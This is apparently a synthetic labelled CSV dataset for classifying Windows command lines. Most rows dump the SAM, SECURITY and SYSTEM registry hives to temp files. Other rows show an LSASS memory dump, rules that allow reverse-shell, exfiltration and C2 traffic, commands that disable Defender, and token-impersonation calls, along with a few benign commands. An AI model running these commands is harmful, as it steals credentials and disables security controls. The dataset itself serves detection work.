text,label
reg export hklm\security c:\windows\temp\07bvr36e.save,1
reg export hklm\sam c:\windows\temp\olwjov3j.save,1
reg  export  hklm\sam  c:\windows\temp\t9cg754j.save,1
rule:  reverse  shell  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg export hklm\security c:\windows\temp\givoltvu.save,1
reg export hklm\sam c:\windows\temp\u4wlb0nw.save,1
reg save hklm\security c:\windows\temp\j12ilrpk.save,1
reg save hklm\system c:\windows\temp\reiatsa6.save,1
reg save hklm\system c:\windows\temp\4o67j4qs.save,1
reg export hklm\system c:\windows\temp\okp6up9u.save,1
reg save hklm\security c:\windows\temp\3gumj87x.save,1
reg export hklm\system c:\windows\temp\s3ytuolu.save,1
reg export hklm\sam c:\windows\temp\ncsx7x41.save,1
reg export hklm\system c:\windows\temp\ofxpsfyv.save,1
reg save hklm\sam c:\windows\temp\rxftlli8.save,1
reg export hklm\security c:\windows\temp\jtbzjfvz.save,1
reg save hklm\system c:\windows\temp\pi1bc3g8.save,1
reg save hklm\system c:\windows\temp\14f14r3a.save,1
reg save hklm\system c:\windows\temp\j4f6j04g.save,1
reg export hklm\system c:\windows\temp\wetqx0tn.save,1
reg export hklm\sam c:\windows\temp\d3cittde.save,1
reg export hklm\security c:\windows\temp\o9iok2dk.save,1
reg save hklm\security c:\windows\temp\2n4mkvjc.save,1
reg   save   hklm\system   c:\windows\temp\dx56ym5o.save,1
reg save hklm\security c:\windows\temp\y50v46ga.save,1
reg export hklm\security c:\windows\temp\c9nucn80.save,1
"cmd.exe /c ""get-help  adjusttokenprivileges  -full""",0
reg save hklm\sam c:\windows\temp\5y3ugmg4.save,1
reg export hklm\sam c:\windows\temp\qh0nlul1.save,1
"powershell -nop -c ""reg  export  hklm\sam  c:\windows\temp\mowwv5tz.save""",1
reg export hklm\sam c:\windows\temp\35iz7pq0.save,1
reg export hklm\sam c:\windows\temp\trrhv5az.save,1
reg save hklm\security c:\windows\temp\11yqp0y9.save,1
reg save hklm\sam c:\windows\temp\taaosc6l.save,1
reg save hklm\security c:\windows\temp\nzb0agxi.save,1
reg export hklm\security c:\windows\temp\qkgdadsg.save,1
reg export hklm\security c:\windows\temp\xdec4mdd.save,1
reg export hklm\system c:\windows\temp\zs3gkkd1.save,1
reg export hklm\system c:\windows\temp\27n6fl18.save,1
"cmd.exe /c ""reg export hklm\system c:\windows\temp\ks66z4bc.save""",1
reg export hklm\security c:\windows\temp\rd2njeet.save,1
reg export hklm\security c:\windows\temp\5bvo1grc.save,1
reg save hklm\sam c:\windows\temp\mq5h1wra.save,1
reg export hklm\security c:\windows\temp\tqusy23o.save,1
reg save hklm\sam c:\windows\temp\hj95s0it.save,1
reg save hklm\system c:\windows\temp\q1a2sbah.save,1
reg  save  hklm\sam  c:\windows\temp\gliypvyi.save,1
reg save hklm\sam c:\windows\temp\re6pxkl4.save,1
reg save hklm\system c:\windows\temp\0lls0odp.save,1
"powershell -nop -c ""systeminfo""",0
reg   export   hklm\security   c:\windows\temp\gpvtsej8.save,1
reg export hklm\sam c:\windows\temp\u1ftqep2.save,1
reg export hklm\sam c:\windows\temp\g4egrffv.save,1
reg export hklm\system c:\windows\temp\z4x27ud8.save,1
reg save hklm\system c:\windows\temp\lja9ywfe.save,1
reg export hklm\system c:\windows\temp\cic0ecgt.save,1
reg export hklm\sam c:\windows\temp\0myvcten.save,1
reg save hklm\security c:\windows\temp\29v86v6k.save,1
reg export hklm\security c:\windows\temp\vff6r0xl.save,1
reg save hklm\security c:\windows\temp\r2zrtpck.save,1
reg export hklm\sam c:\windows\temp\gxo16rsj.save,1
"powershell -nop -c ""rule:   exfil   data   |   app:   any   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
reg export hklm\security c:\windows\temp\30sijonh.save,1
reg export hklm\system c:\windows\temp\b3pysn3t.save,1
reg export hklm\system c:\windows\temp\lj85mjkg.save,1
reg save hklm\system c:\windows\temp\hpgqnyr4.save,1
reg save hklm\system c:\windows\temp\9akj9cgf.save,1
reg save hklm\system c:\windows\temp\5osyta7w.save,1
reg export hklm\security c:\windows\temp\6sgxery2.save,1
reg export hklm\security c:\windows\temp\ygt4i1zy.save,1
reg export hklm\system c:\windows\temp\g433rnmn.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
reg export hklm\security c:\windows\temp\k1tgz7t2.save,1
reg  save  hklm\system  c:\windows\temp\yznx1cxv.save,1
reg export hklm\security c:\windows\temp\a2u4nz1d.save,1
"powershell -nop -c ""rule: reverse shell | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: tcp 8888""",2
"cmd.exe /c ""reg  save  hklm\sam  c:\windows\temp\yi85bm6x.save""",1
reg export hklm\security c:\windows\temp\k5nqer8j.save,1
reg export hklm\system c:\windows\temp\pig6rzpl.save,1
"powershell -nop -c ""reg export hklm\system c:\windows\temp\r8k26erd.save""",1
reg export hklm\sam c:\windows\temp\72u761c7.save,1
reg export hklm\security c:\windows\temp\hbzqfugt.save,1
reg save hklm\security c:\windows\temp\3ka7jrxw.save,1
reg export hklm\sam c:\windows\temp\uhv2ekuj.save,1
reg export hklm\system c:\windows\temp\7du3ma3k.save,1
reg export hklm\system c:\windows\temp\0c6wrkz5.save,1
reg save hklm\system c:\windows\temp\o07hzeol.save,1
"powershell -nop -c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: 1337""",2
reg export hklm\sam c:\windows\temp\mskyw93w.save,1
reg export hklm\system c:\windows\temp\toepq5v1.save,1
reg save hklm\sam c:\windows\temp\irwm3tze.save,1
reg save hklm\sam c:\windows\temp\rskkbhae.save,1
reg save hklm\sam c:\windows\temp\3rvpll01.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg export hklm\sam c:\windows\temp\m4qskmdw.save,1
reg export hklm\system c:\windows\temp\w06jnz8y.save,1
reg export hklm\security c:\windows\temp\kdnasi91.save,1
reg save hklm\system c:\windows\temp\78x0gn3q.save,1
"powershell -nop -c ""rule: c2 beacon | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\sam c:\windows\temp\fgiay0es.save,1
reg export hklm\security c:\windows\temp\b3mbcr10.save,1
reg save hklm\system c:\windows\temp\aaxz9dht.save,1
reg save hklm\security c:\windows\temp\6lf9oeaz.save,1
"[dllimport(""advapi32.dll"")] extern bool amsiutils(...)",3
reg save hklm\sam c:\windows\temp\bjd7dqe7.save,1
reg export hklm\sam c:\windows\temp\40jk2jsg.save,1
reg save hklm\sam c:\windows\temp\z5bygr31.save,1
reg save hklm\system c:\windows\temp\l740vn6i.save,1
reg export hklm\system c:\windows\temp\xtg9rpzk.save,1
reg export hklm\sam c:\windows\temp\fxv2fep8.save,1
reg save hklm\system c:\windows\temp\ct13k4yn.save,1
reg export hklm\security c:\windows\temp\l10t8gb1.save,1
reg export hklm\sam c:\windows\temp\2r1itlp1.save,1
reg save hklm\security c:\windows\temp\s3i8461u.save,1
reg   export   hklm\system   c:\windows\temp\cbl1xb6q.save,1
reg export hklm\system c:\windows\temp\dibper9l.save,1
rule: exfil data | app: any | dir: outbound | act: allow | port: 4444,2
reg save hklm\sam c:\windows\temp\0cm3c0hm.save,1
reg save hklm\system c:\windows\temp\i64g7j19.save,1
reg export hklm\sam c:\windows\temp\lgxjo62b.save,1
reg save hklm\security c:\windows\temp\kimllt0v.save,1
reg export hklm\sam c:\windows\temp\nov5ix5x.save,1
reg save hklm\security c:\windows\temp\dzgw44md.save,1
reg save hklm\sam c:\windows\temp\8k5eovt3.save,1
reg export hklm\sam c:\windows\temp\wyur6zkc.save,1
reg save hklm\sam c:\windows\temp\0a3baijc.save,1
reg save hklm\sam c:\windows\temp\urbaygfi.save,1
reg export hklm\security c:\windows\temp\g1ct0u5a.save,1
reg save hklm\sam c:\windows\temp\9btb38qq.save,1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\d7h9lr3c.save""",1
reg export hklm\sam c:\windows\temp\wnbrz3wk.save,1
rule:  c2  beacon  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444,2
"cmd.exe /c ""rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  4444""",2
reg export hklm\security c:\windows\temp\cj9pcwyo.save,1
"powershell -nop -c ""reg  save  hklm\system  c:\windows\temp\2gfchshv.save""",1
reg export hklm\security c:\windows\temp\z52k3gj9.save,1
reg export hklm\system c:\windows\temp\0qtysor3.save,1
reg save hklm\security c:\windows\temp\f9ozigw6.save,1
"powershell -nop -c ""[dllimport(""advapi32.dll"")]  extern  bool  duplicatetokenex(...)""",3
reg export hklm\system c:\windows\temp\69pn7pqc.save,1
reg query hkcu\console,0
"cmd.exe /c ""set-mppreference  -disablerealtimemonitoring  $true""",2
reg export hklm\sam c:\windows\temp\9ztzxb2s.save,1
reg export hklm\security c:\windows\temp\28pt2j3x.save,1
reg export hklm\system c:\windows\temp\fht0g0j7.save,1
reg save hklm\security c:\windows\temp\j12gxso3.save,1
reg export hklm\system c:\windows\temp\jg39jv1m.save,1
reg export hklm\system c:\windows\temp\fpuelve8.save,1
reg save hklm\system c:\windows\temp\4iehvzns.save,1
"powershell -nop -c ""rule: exfil data | app: c:\windows\temp\nc.exe | dir: outbound | act: allow | port: 1337""",2
reg export hklm\system c:\windows\temp\enk0az4c.save,1
"powershell -nop -c ""reg  save  hklm\sam  c:\windows\temp\epjgyoqm.save""",1
"cmd.exe /c ""reg  export  hklm\security  c:\windows\temp\xjz6hgb0.save""",1
reg export hklm\sam c:\windows\temp\fz9lmidr.save,1
reg save hklm\system c:\windows\temp\v0cutprj.save,1
reg export hklm\security c:\windows\temp\8ox5wclw.save,1
reg export hklm\security c:\windows\temp\k0cx3a1n.save,1
"cmd.exe /c ""reg   export   hklm\sam   c:\windows\temp\wd2ev4qz.save""",1
reg save hklm\sam c:\windows\temp\rjcq20q1.save,1
reg save hklm\security c:\windows\temp\974wkgte.save,1
"powershell -nop -c ""start  cmd.exe  /c  whoami""",0
reg save hklm\sam c:\windows\temp\fikgxic3.save,1
reg export hklm\security c:\windows\temp\zkndvbw0.save,1
reg save hklm\sam c:\windows\temp\mlpeeh6o.save,1
reg export hklm\security c:\windows\temp\ped92xdt.save,1
rule:  exfil  data  |  app:  any  |  dir:  outbound  |  act:  allow  |  port:  4444,2
reg export hklm\system c:\windows\temp\lm01ie59.save,1
reg save hklm\security c:\windows\temp\3eaiqoym.save,1
reg save hklm\security c:\windows\temp\0i9w9xs8.save,1
reg save hklm\security c:\windows\temp\h1b1o4mk.save,1
reg export hklm\system c:\windows\temp\j2jwulc6.save,1
reg save hklm\sam c:\windows\temp\va0ngfjg.save,1
reg export hklm\sam c:\windows\temp\te5zhi5h.save,1
reg save hklm\system c:\windows\temp\lpnbt7fo.save,1
reg export hklm\security c:\windows\temp\x1geu2nw.save,1
reg export hklm\sam c:\windows\temp\ila7lyp4.save,1
reg save hklm\system c:\windows\temp\ti3kqt0o.save,1
"cmd.exe /c ""rundll32.exe c:\windows\system32\comsvcs.dll, minidump 1234 c:\temp\lsass.dmp full""",1
reg export hklm\security c:\windows\temp\4z5lh2s9.save,1
reg save hklm\system c:\windows\temp\ssoh9mpl.save,1
reg export hklm\security c:\windows\temp\pird9061.save,1
reg export hklm\system c:\windows\temp\c83cq6zl.save,1
reg save hklm\sam c:\windows\temp\bfixh58z.save,1
reg export hklm\security c:\windows\temp\3j5tj38f.save,1
reg export hklm\security c:\windows\temp\7a5xc8y5.save,1
reg export hklm\security c:\windows\temp\t9mkoiuw.save,1
reg export hklm\system c:\windows\temp\bykqh2p2.save,1
reg export hklm\sam c:\windows\temp\dbl0u8l6.save,1
reg export hklm\sam c:\windows\temp\gzkaqjd7.save,1
"cmd.exe /c ""powershell   get-process""",0
reg export hklm\sam c:\windows\temp\q65q0jdi.save,1
reg  export  hklm\sam  c:\windows\temp\77z7iskg.save,1
reg save hklm\security c:\windows\temp\oylso6vc.save,1
reg save hklm\sam c:\windows\temp\f1r376hy.save,1
reg save hklm\security c:\windows\temp\xj68bux5.save,1
"cmd.exe /c ""reg  export  hklm\system  c:\windows\temp\qvuj2fvt.save""",1
reg save hklm\sam c:\windows\temp\6sbko33f.save,1
reg export hklm\sam c:\windows\temp\70jy5tuo.save,1
reg export hklm\system c:\windows\temp\pakhpy68.save,1
reg save hklm\security c:\windows\temp\m4rl2rca.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   tcp   8888""",2
reg export hklm\sam c:\windows\temp\05v2bl5t.save,1
rule:   exfil   data   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444,2
reg export hklm\system c:\windows\temp\s0ufqktd.save,1
"powershell -nop -c ""$a   =   [ref].assembly.gettype('system.management.automation.duplicatetokenex')""",3
reg save hklm\system c:\windows\temp\xseuf5sy.save,1
reg export hklm\security c:\windows\temp\vx1mm2fg.save,1
"cmd.exe /c ""notepad.exe""",0
"cmd.exe /c ""reg export hklm\system c:\windows\temp\3614wswg.save""",1
reg save hklm\sam c:\windows\temp\ebogb05p.save,1
systeminfo,0
reg export hklm\system c:\windows\temp\6g0h3wj6.save,1
rule:  exfil  data  |  app:  c:\windows\temp\nc.exe  |  dir:  outbound  |  act:  allow  |  port:  tcp  8888,2
reg export hklm\sam c:\windows\temp\5mcwqrnr.save,1
reg export hklm\sam c:\windows\temp\p7u2nj3a.save,1
reg save hklm\security c:\windows\temp\5boodjnc.save,1
reg export hklm\sam c:\windows\temp\akakv9be.save,1
reg export hklm\system c:\windows\temp\q0ygwdfb.save,1
reg export hklm\security c:\windows\temp\j3p8doxj.save,1
reg save hklm\security c:\windows\temp\09j5i0y1.save,1
reg export hklm\system c:\windows\temp\7176c0k5.save,1
reg export hklm\sam c:\windows\temp\ahfclo6l.save,1
reg save hklm\sam c:\windows\temp\2bobqnns.save,1
reg export hklm\sam c:\windows\temp\gfaye56a.save,1
reg export hklm\security c:\windows\temp\i2b2430f.save,1
reg save hklm\security c:\windows\temp\y6ggt6ut.save,1
reg save hklm\system c:\windows\temp\053edvrq.save,1
reg save hklm\security c:\windows\temp\5w83r22s.save,1
reg save hklm\security c:\windows\temp\w2a8a14p.save,1
reg export hklm\sam c:\windows\temp\wmiaxrqw.save,1
reg export hklm\sam c:\windows\temp\qtnidtz5.save,1
reg export hklm\system c:\windows\temp\9vr4l906.save,1
"powershell -nop -c ""$a = [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
"[dllimport(""advapi32.dll"")] extern bool openprocesstoken(...)",3
reg save hklm\sam c:\windows\temp\kbvze2tx.save,1
reg save hklm\sam c:\windows\temp\7cx56jni.save,1
"cmd.exe /c ""$a  =  [ref].assembly.gettype('system.management.automation.impersonateloggedonuser')""",3
reg export hklm\system c:\windows\temp\1l1kmbux.save,1
reg export hklm\security c:\windows\temp\5pjp9wy5.save,1
"powershell -nop -c ""sc  stop  windefend""",2
reg save hklm\system c:\windows\temp\lpdjfdsg.save,1
reg export hklm\sam c:\windows\temp\s3q1fx3f.save,1
reg save hklm\sam c:\windows\temp\lxtvggj2.save,1
"cmd.exe /c ""$a = [ref].assembly.gettype('system.management.automation.openprocesstoken')""",3
reg export hklm\sam c:\windows\temp\uizy46pe.save,1
reg export hklm\system c:\windows\temp\alysr3fp.save,1
reg export hklm\system c:\windows\temp\fe9r5ifo.save,1
reg export hklm\system c:\windows\temp\nebgzynn.save,1
reg export hklm\security c:\windows\temp\jny41j7b.save,1
reg save hklm\sam c:\windows\temp\2sxf8g96.save,1
reg export hklm\sam c:\windows\temp\jko3cb0a.save,1
reg export hklm\system c:\windows\temp\r44aq0uk.save,1
"powershell -nop -c ""klist  purge""",3
reg   export   hklm\security   c:\windows\temp\yuyfdlui.save,1
"cmd.exe /c ""reg  save  hklm\system  c:\windows\temp\ugdylp0s.save""",1
reg save hklm\sam c:\windows\temp\o2nxmfep.save,1
reg export hklm\system c:\windows\temp\9iaupfdo.save,1
reg export hklm\security c:\windows\temp\pp06jqra.save,1
reg save hklm\sam c:\windows\temp\syil2216.save,1
reg save hklm\security c:\windows\temp\im49ojbb.save,1
reg save hklm\system c:\windows\temp\kiacdlqi.save,1
reg export hklm\security c:\windows\temp\1ix4qq0p.save,1
reg export hklm\system c:\windows\temp\0ven1ktz.save,1
reg export hklm\sam c:\windows\temp\23mgd93y.save,1
reg export hklm\security c:\windows\temp\zu2ctdmy.save,1
reg save hklm\sam c:\windows\temp\mwyhpygl.save,1
reg save hklm\security c:\windows\temp\ecubf942.save,1
reg save hklm\sam c:\windows\temp\hqt65o1k.save,1
"powershell -nop -c ""ping 192.168.1.1""",0
reg export hklm\sam c:\windows\temp\g72qwvqw.save,1
reg save hklm\security c:\windows\temp\tby4kpmz.save,1
reg export hklm\security c:\windows\temp\k07ovnuq.save,1
reg save hklm\security c:\windows\temp\vcu0g3f7.save,1
reg export hklm\system c:\windows\temp\a9wz5g0k.save,1
reg save hklm\security c:\windows\temp\xo5u0guu.save,1
"cmd.exe /c ""rule: exfil data | app: c:\users\public\malware.exe | dir: outbound | act: allow | port: tcp 8888""",2
reg save hklm\sam c:\windows\temp\qldm1drg.save,1
reg save hklm\security c:\windows\temp\awum9w8b.save,1
reg save hklm\system c:\windows\temp\ispbv7za.save,1
reg save hklm\security c:\windows\temp\x29pq1nw.save,1
reg  save  hklm\security  c:\windows\temp\vxu74du3.save,1
reg save hklm\system c:\windows\temp\nwbu5gm6.save,1
reg export hklm\security c:\windows\temp\w0mky396.save,1
reg export hklm\system c:\windows\temp\bsv061ok.save,1
reg save hklm\security c:\windows\temp\t1sdl0jo.save,1
reg export hklm\system c:\windows\temp\hieuugbc.save,1
reg save hklm\security c:\windows\temp\b5vckzi9.save,1
reg save hklm\system c:\windows\temp\fllf71cd.save,1
reg export hklm\system c:\windows\temp\nm2w8130.save,1
"powershell -nop -c ""reg   export   hklm\security   c:\windows\temp\iase5v6g.save""",1
reg export hklm\system c:\windows\temp\j4t97i4a.save,1
reg export hklm\sam c:\windows\temp\8ukgz778.save,1
reg export hklm\system c:\windows\temp\ks69vvnl.save,1
reg save hklm\sam c:\windows\temp\hvjns64t.save,1
reg save hklm\security c:\windows\temp\fu95kt4o.save,1
reg export hklm\security c:\windows\temp\i30cr86k.save,1
reg save hklm\system c:\windows\temp\rg2lcywm.save,1
reg save hklm\system c:\windows\temp\9pkt67dz.save,1
reg save hklm\system c:\windows\temp\yiozb98u.save,1
reg save hklm\security c:\windows\temp\rtpu77jn.save,1
"[dllimport(""advapi32.dll"")] extern bool impersonateloggedonuser(...)",3
reg save hklm\system c:\windows\temp\lgy2ax41.save,1
reg save hklm\security c:\windows\temp\oftxgkld.save,1
"cmd.exe /c ""[dllimport(""advapi32.dll"")]   extern   bool   openprocesstoken(...)""",3
reg save hklm\system c:\windows\temp\xy7s80r7.save,1
reg export hklm\security c:\windows\temp\2dho4aqs.save,1
reg export hklm\system c:\windows\temp\bdw1sppi.save,1
"powershell -nop -c ""rule:   reverse   shell   |   app:   c:\users\public\malware.exe   |   dir:   outbound   |   act:   allow   |   port:   4444""",2
